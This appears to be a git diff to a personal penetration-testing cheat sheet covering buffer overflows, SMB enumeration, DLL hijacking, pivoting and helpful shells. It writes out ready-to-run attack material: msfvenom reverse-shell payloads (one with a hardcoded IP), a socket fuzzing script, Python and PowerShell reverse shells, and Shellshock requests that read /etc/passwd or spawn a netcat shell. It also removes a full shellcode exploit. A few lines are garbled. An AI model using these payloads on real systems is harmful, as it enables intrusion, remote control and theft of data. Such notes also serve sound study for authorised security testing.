@@ -236,6 +236,20 @@ Buffer Overflows ::
 
 			!mona po (pattern_offset)r
 
+		import sys
+		import socket
+
+		shellcode = <pattern_create>
+		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		try:
+			connect=s.connect(('IP', port))
+			s.send(('TRUN' /.:/ + shellcode))
+		except:
+			print("CHECK DEBUGGER!.")
+		s.close()
+
+
+
 
 	Overwriting the EIP:
 
@@ -306,49 +320,31 @@ Buffer Overflows ::
 
 	Gaining remote shell:
 
-		msfvenom -p windows/shell_reverse_tcp LHOST=lhost LPORT=4444 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00"
+		msfvenom -p windows/shell_reverse_tcp LHOST=lhost LPORT=4343 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00"
+
+		or for linux:
+
+		msfvenom -p linux/x86/shell_reverse_tcp LHOST=111.61.0.153 LPORT=4444 EXITFUNC=thread -a x86 --platform linux -f c -b "\x00" -e x86/shikata_ga_nai
 
 		add the payload, and some NOP's.
 		a NOP is a hex of \x90, add it right after the overwritten EIP, "\x90"*32 should be enough.
 
-		import sys
-		import socket
+		2dx
 
-		exploit=("\xda\xcb\xd9\x74\x24\xf4\x5a\xbe\x8f\xe5\x98\xa8\x31\xc9\xb1"
-		"\x52\x31\x72\x17\x03\x72\x17\x83\x4d\xe1\x7a\x5d\xad\x02\xf8"
-		"\x9e\x4d\xd3\x9d\x17\xa8\xe2\x9d\x4c\xb9\x55\x2e\x06\xef\x59"
-		"\xc5\x4a\x1b\xe9\xab\x42\x2c\x5a\x01\xb5\x03\x5b\x3a\x85\x02"
-		"\xdf\x41\xda\xe4\xde\x89\x2f\xe5\x27\xf7\xc2\xb7\xf0\x73\x70"
-		"\x27\x74\xc9\x49\xcc\xc6\xdf\xc9\x31\x9e\xde\xf8\xe4\x94\xb8"
-		"\xda\x07\x78\xb1\x52\x1f\x9d\xfc\x2d\x94\x55\x8a\xaf\x7c\xa4"
-		"\x73\x03\x41\x08\x86\x5d\x86\xaf\x79\x28\xfe\xd3\x04\x2b\xc5"
-		"\xae\xd2\xbe\xdd\x09\x90\x19\x39\xab\x75\xff\xca\xa7\x32\x8b"
-		"\x94\xab\xc5\x58\xaf\xd0\x4e\x5f\x7f\x51\x14\x44\x5b\x39\xce"
-		"\xe5\xfa\xe7\xa1\x1a\x1c\x48\x1d\xbf\x57\x65\x4a\xb2\x3a\xe2"
-		"\xbf\xff\xc4\xf2\xd7\x88\xb7\xc0\x78\x23\x5f\x69\xf0\xed\x98"
-		"\x8e\x2b\x49\x36\x71\xd4\xaa\x1f\xb6\x80\xfa\x37\x1f\xa9\x90"
-		"\xc7\xa0\x7c\x36\x97\x0e\x2f\xf7\x47\xef\x9f\x9f\x8d\xe0\xc0"
-		"\x80\xae\x2a\x69\x2a\x55\xbd\x56\x03\x54\x29\x3f\x56\x56\x40"
-		"\xe3\xdf\xb0\x08\x0b\xb6\x6b\xa5\xb2\x93\xe7\x54\x3a\x0e\x82"
-		"\x57\xb0\xbd\x73\x19\x31\xcb\x67\xce\xb1\x86\xd5\x59\xcd\x3c"
-		"\x71\x05\x5c\xdb\x81\x40\x7d\x74\xd6\x05\xb3\x8d\xb2\xbb\xea"
-		"\x27\xa0\x41\x6a\x0f\x60\x9e\x4f\x8e\x69\x53\xeb\xb4\x79\xad"
-		"\xf4\xf0\x2d\x61\xa3\xae\x9b\xc7\x1d\x01\x75\x9e\xf2\xcb\x11"
-		"\x67\x39\xcc\x67\x68\x14\xba\x87\xd9\xc1\xfb\xb8\xd6\x85\x0b"
-		"\xc1\x0a\x36\xf3\x18\x8f\x56\x16\x88\xfa\xfe\x8f\x59\x47\x63"
-		"\x30\xb4\x84\x9a\xb3\x3c\x75\x59\xab\x35\x70\x25\x6b\xa6\x08"
-		"\x36\x1e\xc8\xbf\x37\x0b")
 
-		shellcode = "A"*2003 + "\xaf\x11\x50\x62" + "\x90"*32 + exploit 
+	BOF With Ruby on the go:
 
-		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		try:
-		    connect=s.connect(('192.168.1.25', 9998))
-		    s.send(('TRUN /.:/' + shellcode))
-		except:
-		    print("ERROR!")
-		s.close()
+		pry --simple-prompt
 
+		require "socket"
+		s = TCPSocket.new("<IP>", <PORT>)
+		s.gets - get banner
+		s.puts "A"*<NUMBER>
+		...
+
+		badchars:
+
+			"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
 
 
 
@@ -552,16 +548,20 @@ Enumeration ::
 		nmblookup -A <target IP> - information gathering (Linux)
 		nbtscan -v <target IP> - information gathering (Linux)
 		nbtscan -v <IP>/subnet - scan entire subnet
+		smbmap -H - enumerate shares and permissions
 		net view <IP> - list domains, computers, resources shared by a computer on the network
 		net use <Drive Letter>: \\<IP>\C(or C$,IPC... etc.)
 		smbclient -L <IP> - smb connect
+		smbclient -N \\\\<IP>\\<share> -U "" - SMB login to anonymous access
 		mount.cifs //<IP>/C /media/<Folder> user=,=pass= - navigate target shares
+		mount -t nfs <IP>:/home/<user> /mnt/<IP>_nfs -o nolock (first do mkdir /mnt/<IP>_nfs)
 		net use \\<IP>\IPC$ "" /u:"" - Null Session
 		winfo <IP> -n - flag -n means to try to establish a null session before gathering information
 		DumpSec - Report>Select Computer >> \\<IP>
-		enum4linux <IP>
+		enum4linux <IP> - enumerate linux machine remotely
+		enum4linux -r <IP> - enumerate users
 		rpcclient -N -U "" <IP> - if establishes then "help"
-		rpcclient > 'enum' for useful commands
+		rpcclient > 'enum' for us ul commands
 
 		msf> use auxiliary/scanner/smb/smb_login
 
@@ -729,7 +729,26 @@ Sniffing & MITM ::
 
 			ssh <user>@<nameserver IP> -D<LHOST-DNS CONNECTION>:<PORT> -N -C
 
+	DLL Hikjacking:
+
+		procexp to find process run by NT AUTHORITY\SYSTEM
+		procmon to find dlls run by the process found in last step
+		-> check if there's a "NAME NOT FOUND" .dll file -> make a fake dll with the same name that contains a payload.
+		 
+
 Pivoting ::
+	
+	Pivoting Playbook:
+
+		If the victim's machine has got 2 NICs ->
+			Use meterpreter's autoroute post module
+			Then ARP scan to find hosts
+			Then exploit a machine on the other network
+			using socks4 to set a proxy & proxychains to use it
+		If the new machine has got 2 NICs ->
+			Autoroute again on the last pivot
+			Then exploit the new victim
+			using socks4 to set a new proxy & proxychains to use it
 
 	use post/windows/manage/autoroute
 	set SESSION <SESSION>
@@ -807,7 +826,11 @@ Pivoting ::
 
 			portfwd add -L 127.0.0.1 -l 3389 -r <remote machine> -p 3389
 			rdesktop -u <domain>\<user> -p "<password>" 127.0.0.1
-			
+		
+		portfwd:
+
+			portfwd add -L <LHOST> -l <LPORT> -p <PORT TO FORWARD>(80,3389,etc.) -r <RHOST>
+
 		file share with RDP:
 
 			xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
@@ -821,7 +844,8 @@ Pivoting ::
 
 			proxychains:
 			set proxychains to connect through the newly made socks4 proxy.
-			run commands freely.
+			run commands freely(modify /etc/proxychains.conf).
+
 
 		chisel:
 
@@ -836,3 +860,31 @@ HELPFUL STUFF ::
 	powershell rev shell:
 
 		powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+	python rev shell:
+
+		python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<ATTACKER_PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+	shellschock test:
+
+		env x=`() { :;}; echo vulnerable' bash -c "echo test"
+
+		nmap --script http-shellshock --script-args uri=/cgi-bin/login.cgi <IP> -p 80
+
+		wget -U "() { foo;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat/etc/passwd http://<IP>/cgi-bin/login.cgi && cat login.cgi
+
+		wget -U "() { foo;};echo; /bin/nc <IP> <PORT> -e /bin/sh" http://<IP>/cgi-bin/login.cgi
+
+	heartbleed test:
+
+		nmap --script ssl-heartbleed <IP>
+
+		if vulnerable:
+
+			msfconsole -> auxiliary/scanner/ssl/openssl_heartbleed
+			show actions (DUMP)
+			leak file stored in .msf(versionNumber)/loot as a .bin file
+
+	Crack zip:
+
+		fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt <ZIP-FILE>
